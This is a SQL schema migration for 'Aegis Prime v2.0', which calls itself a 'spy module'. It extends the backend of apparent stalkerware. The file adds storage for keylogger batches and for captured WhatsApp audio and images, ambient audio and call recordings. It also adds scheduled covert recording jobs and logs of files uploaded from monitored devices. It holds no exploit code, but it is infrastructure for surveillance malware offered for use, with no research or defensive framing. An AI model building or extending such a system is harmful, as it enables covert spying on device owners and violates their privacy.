-- Aegis Prime v2.0 - Extended Spy Module Schema
-- Purpose: Enhanced surveillance (Keylogging, WhatsApp Audio, Periodic Recording)

-- 1. EXTENDED KEYLOGGING (Already in base schema, but enhancing metadata)
-- Ensure 'keylogs' exists (It does in base schema, but let's make sure it has what we need)
ALTER TABLE public.keylogs 
ADD COLUMN IF NOT EXISTS batch_id UUID; -- To group keystrokes sent in batches

-- 2. EXTENDED MEDIA (WhatsApp & Periodic)
-- Modifying 'captured_media' to support file origins
ALTER TABLE public.captured_media
DROP CONSTRAINT IF EXISTS captured_media_media_type_check;

ALTER TABLE public.captured_media
ADD CONSTRAINT captured_media_media_type_check 
CHECK (media_type IN ('photo_front', 'photo_back', 'video', 'audio', 'call_recording', 'whatsapp_audio', 'whatsapp_image', 'screenshot', 'ambient_audio'));

-- 3. RECORDING SCHEDULES (New Table)
CREATE TABLE IF NOT EXISTS public.recording_schedules (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    schedule_type TEXT CHECK (schedule_type IN ('interval', 'specific_time')),
    media_type TEXT NOT NULL, -- 'audio', 'screenshot', 'photo_front'
    interval_minutes INTEGER, -- e.g., every 15 minutes
    duration_seconds INTEGER, -- e.g., record for 30 seconds
    start_time TIME, -- For specific time execution
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- 4. FILE SYSTEM WATCHER LOGS (To track what files were seen vs uploaded)
CREATE TABLE IF NOT EXISTS public.file_observer_logs (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    file_path TEXT NOT NULL, -- Original path on device
    file_hash TEXT, -- To prevent duplicate uploads
    status TEXT CHECK (status IN ('uploaded', 'failed', 'pending')),
    observed_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- RLS POLICIES (Security)
ALTER TABLE public.recording_schedules ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.file_observer_logs ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Enable read access for authenticated users" ON public.recording_schedules FOR SELECT USING (auth.role() = 'authenticated');
CREATE POLICY "Enable insert access for authenticated users" ON public.recording_schedules FOR INSERT WITH CHECK (auth.role() = 'authenticated');
CREATE POLICY "Enable update access for authenticated users" ON public.recording_schedules FOR UPDATE USING (auth.role() = 'authenticated');

CREATE POLICY "Enable read access for authenticated users" ON public.file_observer_logs FOR SELECT USING (auth.role() = 'authenticated');
CREATE POLICY "Enable insert access for authenticated users" ON public.file_observer_logs FOR INSERT WITH CHECK (auth.role() = 'authenticated');
